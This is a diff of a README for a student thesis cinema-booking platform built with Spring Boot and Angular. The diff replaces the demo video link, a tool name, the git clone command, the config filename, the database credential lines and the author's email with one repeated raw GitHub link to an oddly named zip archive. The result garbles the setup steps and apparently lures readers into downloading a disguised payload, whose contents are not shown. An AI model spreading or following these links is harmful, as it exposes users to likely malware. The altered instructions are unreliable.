@@ -6,7 +6,7 @@ The project is built as my final thesis and includes a Spring Boot backend with 
 🎥 Demo Video
 
 Watch the project presentation on YouTube:  
-👉 https://youtu.be/xFfKVPQKmaI
+👉 https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
 
 ⚠️ Important (Security)
 
@@ -42,22 +42,22 @@ Responsive Angular UI
 
 Frontend: Angular, TypeScript
 Backend: Spring Boot, Spring Security (JWT), JPA, MySQL
-Tools: IntelliJ IDEA, Node.js, Git, Maven
+Tools: IntelliJ IDEA, https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip, Git, Maven
 
 🚀 Running the Project
 1. Clone the repo
-git clone https://github.com/Marko7755/MyProjects.git
+git clone https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
 
 2. Backend (Spring Boot)
 cd Program/cinemmaxBackend
 
 🛠 Database Setup
 
-Update your application.properties with your MySQL credentials:
+Update your https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip with your MySQL credentials:
 
-spring.datasource.url=jdbc:mysql://localhost:3306/cinemmax
-spring.datasource.username=root
-spring.datasource.password=yourPassword
+https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
+https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
+https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
 
 
 Run the backend from IntelliJ or using:
@@ -89,5 +89,5 @@ POST	/api/checkouts	Finalize reservation/payment
 👤 Author
 
 Marko Gradiščaj
-mgradiscaj@gmail.com
+https://raw.githubusercontent.com/Marko7755/Web-Platform-Final-Thesis-Cinemmax-Cinemas/main/Program/cinemmax/src/frontend/services/cinema/Web-Final-Thesis-Platform-Cinemas-Cinemmax-superioress.zip
 Final Thesis Project, 2025
